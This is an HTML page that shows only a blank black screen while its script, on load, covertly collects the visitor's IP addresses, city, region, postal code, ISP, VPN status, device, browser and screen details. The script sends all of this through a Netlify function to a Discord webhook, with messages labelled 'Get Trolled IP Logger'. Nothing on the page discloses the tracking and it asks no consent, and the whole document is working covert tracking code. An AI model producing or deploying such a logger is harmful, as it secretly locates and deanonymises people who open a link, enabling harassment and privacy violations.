<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title></title>
  <style>
    html, body {
      margin: 0; padding: 0; height: 100%;
      background: black;
      user-select: none;
      overflow: hidden;
    }
    #error-message {
      position: fixed;
      top: 0; left: 0; right: 0;
      color: red;
      background: black;
      padding: 10px;
      font-family: monospace;
      white-space: pre-wrap;
      cursor: pointer;
      display: none;
      z-index: 9999;
      max-height: 50vh;
      overflow-y: auto;
    }
  </style>
</head>
<body>
  <div id="error-message" title="Click to copy error message"></div>

<script>
  const netlifyFunctionUrl = "/.netlify/functions/log-ip";

  function safeGet(obj, path, defaultValue = '') {
    return path.reduce((acc, key) => (acc && acc[key] !== undefined) ? acc[key] : defaultValue, obj);
  }

  function safeValue(val, maxLen=1024) {
    if (val === undefined || val === null || val === '') return "N/A";
    val = val.toString();
    if (val.length > maxLen) return val.slice(0, maxLen - 3) + '...';
    return val;
  }

  function safeName(name) {
    if (!name) return "N/A";
    return name.length > 256 ? name.slice(0, 253) + "..." : name;
  }

  function parseUserAgent(ua) {
    let device = "Unknown Device";
    let os = "Unknown OS";
    let browser = "Unknown Browser";

    if (/Android/.test(ua)) {
      os = "Android";
      const match = ua.match(/Android.*;\s([^)]+)\)/);
      if (match) device = match[1];
    } else if (/iPhone/.test(ua)) {
      os = "iOS (iPhone)";
      device = "iPhone";
    } else if (/iPad/.test(ua)) {
      os = "iOS (iPad)";
      device = "iPad";
    } else if (/Windows NT/.test(ua)) {
      os = "Windows";
    } else if (/Mac OS X/.test(ua)) {
      os = "Mac OS";
    }

    if (/Chrome\/\d+/.test(ua)) {
      browser = "Chrome";
    } else if (/Firefox\/\d+/.test(ua)) {
      browser = "Firefox";
    } else if (/Safari\/\d+/.test(ua) && !/Chrome/.test(ua)) {
      browser = "Safari";
    } else if (/Edg\/\d+/.test(ua)) {
      browser = "Edge";
    }

    return { device, os, browser };
  }

  function chunkArray(arr, size) {
    const result = [];
    for(let i = 0; i < arr.length; i += size) {
      result.push(arr.slice(i, i + size));
    }
    return result;
  }

  // Country code to currency fallback map (left in case you want to use later)
  const countryToCurrency = {
    US: "USD", GB: "GBP", CA: "CAD", AU: "AUD", IN: "INR",
  };

  // Fetch fallback geo data from ipapi.co for missing fields
  async function fetchFallbackGeo(ip) {
    try {
      const res = await fetch(`https://ipapi.co/${ip}/json/`);
      if (!res.ok) return null;
      return res.json();
    } catch {
      return null;
    }
  }

  async function fetchIPInfo() {
    const res = await fetch('https://ipwhois.app/json/');
    if (!res.ok) throw new Error('Failed to fetch IP info');
    return res.json();
  }

  async function sendDiscordWebhook(embeds) {
    const res = await fetch(netlifyFunctionUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ embeds }),
    });
    if (!res.ok) {
      const text = await res.text();
      throw new Error(`Discord webhook error: ${res.status} - ${text}`);
    }
  }

  (async () => {
    const errorDiv = document.getElementById('error-message');

    try {
      let data = await fetchIPInfo();
      const fallback = await fetchFallbackGeo(data.ip);
      const uaInfo = parseUserAgent(navigator.userAgent);
      const localTime = new Date().toLocaleString("en-US", { timeZone: data.timezone || (fallback ? fallback.timezone : undefined) });

      // Fix missing fields with fallback
      data = {
        ...data,
        city: data.city || (fallback ? fallback.city : 'N/A'),
        region: data.region || (fallback ? fallback.region : 'N/A'),
        postal: data.postal || (fallback ? fallback.postal : 'N/A'),
        ipv6: data.ipv6 || (fallback ? fallback.ipv6 : 'N/A'),
        hostname: data.hostname || (fallback ? fallback.hostname : 'N/A'),
        currency: data.currency || { code: (fallback && fallback.country_code ? countryToCurrency[fallback.country_code] || 'N/A' : 'N/A'), name: 'N/A' },
      };

      // Mobile detection improved (user agent override)
      let isMobile = safeGet(data, ['security', 'is_mobile'], false);
      if (!isMobile) {
        const ua = navigator.userAgent.toLowerCase();
        isMobile = /mobile|android|iphone|ipad|phone/.test(ua);
      }

      // Prepare all fields (with weather/currency removed)
      const allFields = [
        { name: "IPv4 Address", value: `\`${safeValue(data.ip)}\``, inline: true },
        { name: "IPv6 Address", value: safeValue(data.ipv6), inline: true },
        { name: "Hostname", value: safeValue(data.hostname), inline: true },
        { name: "Country", value: `${safeValue(data.country)} (${safeValue(data.country_code)})`, inline: true },
        { name: "Region", value: safeValue(data.region), inline: true },
        { name: "City", value: safeValue(data.city), inline: true },
        { name: "Zip", value: safeValue(data.postal), inline: true },
        { name: "ISP", value: safeValue(data.isp), inline: false },
        { name: "Organization", value: safeValue(data.org), inline: false },
        { name: "ASN", value: safeValue(data.asn), inline: true },
        { name: "Timezone", value: `${safeValue(data.timezone_gmt)} (${safeValue(data.timezone)})`, inline: true },
        { name: "Local Time", value: safeValue(localTime), inline: true },
        { name: "VPN/Proxy", value: safeValue(safeGet(data, ['security', 'is_proxy']) ? "Yes" : "No"), inline: true },
        { name: "VPN/Hosting", value: safeValue(safeGet(data, ['security', 'is_hosting']) ? "Yes" : "No"), inline: true },
        { name: "Mobile", value: safeValue(isMobile ? "Yes" : "No"), inline: true },
        { name: "Bot", value: safeValue(safeGet(data, ['security', 'is_bot']) ? "Yes" : "No"), inline: true },
      ];

      // Add user agent and screen info
      const { device, os, browser } = uaInfo;
      allFields.push(
        { name: "Device", value: safeValue(device), inline: true },
        { name: "Operating System", value: safeValue(os), inline: true },
        { name: "Browser", value: safeValue(browser), inline: true },
        { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
        { name: "Screen Resolution", value: `\`${window.screen.width}Ã—${window.screen.height} (Logical), ${window.screen.width * window.devicePixelRatio}Ã—${window.screen.height * window.devicePixelRatio} (Physical)\``, inline: true }
      );

      // Discord embed max 25 fields, chunk if needed
      const embedChunks = chunkArray(allFields, 25);
      const embeds = embedChunks.map((chunk, i) => ({
        title: i === 0 ? "ðŸ•µï¸ New Visitor Logged" : null,
        color: 0x00ffff,
        timestamp: new Date().toISOString(),
        footer: {
          text: "Get Trolled IP Logger",
          icon_url: "https://i.imgur.com/qZ7j0fV.png"
        },
        author: {
          name: "Get Trolled IP Logger",
          url: "https://discord.com",
          icon_url: "https://i.imgur.com/qZ7j0fV.png"
        },
        fields: chunk
      }));

      await sendDiscordWebhook(embeds);

    } catch (err) {
      const errorDiv = document.getElementById('error-message');
      errorDiv.style.display = 'block';
      errorDiv.textContent = `âŒ Error: ${err.message}\n\nClick to copy`;
      errorDiv.onclick = () => {
        navigator.clipboard.writeText(err.message)
          .then(() => alert("Error message copied! Send it to me."))
          .catch(() => alert("Failed to copy error message."));
      };
    }
  })();
</script>
</body>
</html>
